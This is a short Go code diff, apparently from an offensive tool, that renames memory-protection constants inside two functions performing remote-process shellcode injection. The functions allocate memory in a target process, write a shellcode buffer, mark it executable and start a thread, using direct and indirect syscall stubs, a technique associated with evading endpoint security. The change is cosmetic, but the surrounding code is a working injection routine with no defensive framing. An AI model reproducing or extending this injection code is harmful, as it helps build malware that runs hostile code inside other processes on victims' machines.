@@ -11,7 +11,7 @@ func doNtCreateThreadEx(hProc uintptr, sc []byte) error {
 	sm := newSyscallManager()
 	defer sm.freeStubs()
 
-	allocAddr, err := syscallNtAllocateVirtualMemory(sm, hProc, uintptr(len(sc)), PAGE_READWRITE)
+	allocAddr, err := syscallNtAllocateVirtualMemory(sm, hProc, uintptr(len(sc)), pageReadwrite)
 	if err != nil {
 		return fmt.Errorf("NtAllocateVirtualMemory: %w", err)
 	}
@@ -21,7 +21,7 @@ func doNtCreateThreadEx(hProc uintptr, sc []byte) error {
 		return fmt.Errorf("NtWriteVirtualMemory: %w", err)
 	}
 
-	if _, err := syscallNtProtectVirtualMemory(sm, hProc, allocAddr, uintptr(len(sc)), PAGE_EXECUTE_READ); err != nil {
+	if _, err := syscallNtProtectVirtualMemory(sm, hProc, allocAddr, uintptr(len(sc)), pageExecuteRead); err != nil {
 		syscallNtFreeVirtualMemory(sm, hProc, allocAddr)
 		return fmt.Errorf("NtProtectVirtualMemory: %w", err)
 	}
@@ -41,7 +41,7 @@ func doNtCreateThreadExIndirect(hProc uintptr, sc []byte) error {
 	sm := newSyscallManager()
 	defer sm.freeStubs()
 
-	allocAddr, err := syscallNtAllocateVirtualMemory(sm, hProc, uintptr(len(sc)), PAGE_READWRITE)
+	allocAddr, err := syscallNtAllocateVirtualMemory(sm, hProc, uintptr(len(sc)), pageReadwrite)
 	if err != nil {
 		return doNtCreateThreadEx(hProc, sc)
 	}
@@ -50,7 +50,7 @@ func doNtCreateThreadExIndirect(hProc uintptr, sc []byte) error {
 		return fmt.Errorf("NtWriteVirtualMemory indirect failed: %w", err)
 	}
 
-	if _, err := syscallNtProtectVirtualMemory(sm, hProc, allocAddr, uintptr(len(sc)), PAGE_EXECUTE_READ); err != nil {
+	if _, err := syscallNtProtectVirtualMemory(sm, hProc, allocAddr, uintptr(len(sc)), pageExecuteRead); err != nil {
 		return fmt.Errorf("NtProtectVirtualMemory indirect failed: %w", err)
 	}
 
